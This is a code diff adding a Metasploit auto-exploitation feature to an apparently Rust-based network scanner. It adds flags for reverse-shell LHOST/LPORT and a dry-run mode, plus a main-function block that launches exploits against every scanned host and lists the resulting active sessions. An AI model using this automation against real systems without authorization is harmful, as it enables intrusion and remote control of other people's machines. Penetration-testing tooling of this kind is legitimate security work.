@@ -15,6 +15,7 @@ use regex;
 mod models;
 mod stealth;
 mod cve;
+mod msf;  // Metasploit integration
 mod fingerprint;
 mod output;
 mod banner;
@@ -24,6 +25,7 @@ mod discovery;
 use models::*;
 use stealth::*;
 use cve::*;
+use msf::*;  // Metasploit integration
 use fingerprint::*;
 use banner::*;
 #[cfg(feature = "network-discovery")]
@@ -104,6 +106,26 @@ struct Args {
     /// Update CVE database before scanning
     #[arg(long, default_value_t = false)]
     update_cve: bool,
+
+    /// Enable Metasploit auto-exploitation (requires msfconsole installed)
+    #[arg(long, default_value_t = false)]
+    msf_exploit: bool,
+
+    /// LHOST for Metasploit reverse shells (your IP address)
+    #[arg(long)]
+    msf_lhost: Option<String>,
+
+    /// LPORT for Metasploit reverse shells
+    #[arg(long, default_value_t = 4444)]
+    msf_lport: u16,
+
+    /// Dry-run mode - show what would be exploited without executing
+    #[arg(long, default_value_t = false)]
+    msf_dry_run: bool,
+
+    /// Custom Metasploit path (auto-detected by default)
+    #[arg(long)]
+    msf_path: Option<String>,
 
     #[cfg(feature = "network-discovery")]
     /// Enable network discovery mode (ARP scan, ping sweep, neighbor discovery)
@@ -2389,6 +2411,125 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         duration_ms: duration.num_milliseconds() as u64,
         hosts: all_hosts,
     };
+
+    // Metasploit Auto-Exploitation (if enabled)
+    if args.msf_exploit {
+        if use_stderr {
+            eprintln!("\n{}", "🎯 METASPLOIT AUTO-EXPLOITATION".red().bold());
+            eprintln!("{}", "═".repeat(50).bright_black());
+        } else {
+            println!("\n{}", "🎯 METASPLOIT AUTO-EXPLOITATION".red().bold());
+            println!("{}", "═".repeat(50).bright_black());
+        }
+
+        // Verifica che LHOST sia specificato
+        let lhost = if let Some(ref lhost_val) = args.msf_lhost {
+            lhost_val.clone()
+        } else {
+            // Tenta di auto-rilevare IP locale
+            match local_ip_address::local_ip() {
+                Ok(ip) => {
+                    if use_stderr {
+                        eprintln!("ℹ️ Auto-detected LHOST: {}", ip.to_string().yellow());
+                    } else {
+                        println!("ℹ️ Auto-detected LHOST: {}", ip.to_string().yellow());
+                    }
+                    ip.to_string()
+                }
+                Err(_) => {
+                    eprintln!("❌ Error: LHOST not specified and could not auto-detect. Use --msf-lhost <your-ip>");
+                    std::process::exit(1);
+                }
+            }
+        };
+
+        if args.msf_dry_run {
+            if use_stderr {
+                eprintln!("🔹 {} - Exploits will NOT be executed", "DRY-RUN MODE".yellow().bold());
+            } else {
+                println!("🔹 {} - Exploits will NOT be executed", "DRY-RUN MODE".yellow().bold());
+            }
+        }
+
+        // Inizializza Metasploit client
+        match MetasploitClient::new(args.msf_path.clone()) {
+            Ok(msf_client) => {
+                if use_stderr {
+                    eprintln!("✅ Metasploit Framework initialized");
+                    eprintln!("📍 LHOST: {} | LPORT: {}", lhost.yellow(), args.msf_lport.to_string().yellow());
+                } else {
+                    println!("✅ Metasploit Framework initialized");
+                    println!("📍 LHOST: {} | LPORT: {}", lhost.yellow(), args.msf_lport.to_string().yellow());
+                }
+
+                // Auto-exploitation
+                let exploit_results = auto_exploit_scan_results(
+                    &scan_results,
+                    &msf_client,
+                    &lhost,
+                    args.msf_dry_run
+                ).await;
+
+                // Summary degli exploit
+                if use_stderr {
+                    eprintln!("\n{}", "📊 EXPLOITATION SUMMARY".cyan().bold());
+                    eprintln!("{}", "═".repeat(50).bright_black());
+                } else {
+                    println!("\n{}", "📊 EXPLOITATION SUMMARY".cyan().bold());
+                    println!("{}", "═".repeat(50).bright_black());
+                }
+
+                let successful = exploit_results.iter().filter(|r| r.success).count();
+                let failed = exploit_results.len() - successful;
+
+                if use_stderr {
+                    eprintln!("Total exploits attempted: {}", exploit_results.len());
+                    eprintln!("✅ Successful: {}", successful.to_string().green());
+                    eprintln!("❌ Failed: {}", failed.to_string().red());
+                } else {
+                    println!("Total exploits attempted: {}", exploit_results.len());
+                    println!("✅ Successful: {}", successful.to_string().green());
+                    println!("❌ Failed: {}", failed.to_string().red());
+                }
+
+                if successful > 0 {
+                    if use_stderr {
+                        eprintln!("\n{}", "🎉 Active Sessions:".green().bold());
+                    } else {
+                        println!("\n{}", "🎉 Active Sessions:".green().bold());
+                    }
+                    for result in exploit_results.iter().filter(|r| r.success) {
+                        if let Some(session_id) = result.session_id {
+                            if use_stderr {
+                                eprintln!("  Session {}: {} ({})", 
+                                    session_id.to_string().bright_yellow(),
+                                    result.target_info.green(),
+                                    result.module_used.bright_blue());
+                            } else {
+                                println!("  Session {}: {} ({})", 
+                                    session_id.to_string().bright_yellow(),
+                                    result.target_info.green(),
+                                    result.module_used.bright_blue());
+                            }
+                        }
+                    }
+
+                    if use_stderr {
+                        eprintln!("\n💡 To interact with sessions:");
+                        eprintln!("   msfconsole -q -x \"sessions -i <session_id>\"");
+                    } else {
+                        println!("\n💡 To interact with sessions:");
+                        println!("   msfconsole -q -x \"sessions -i <session_id>\"");
+                    }
+                }
+            }
+            Err(e) => {
+                eprintln!("❌ Metasploit initialization failed: {}", e);
+                eprintln!("   Make sure Metasploit Framework is installed:");
+                eprintln!("   https://www.metasploit.com/download");
+            }
+        }
+    }
 
     // Serialization (Human, JSON, YAML, XML, CSV, MD, HTML)
     let output = match args.output_format.as_str() {
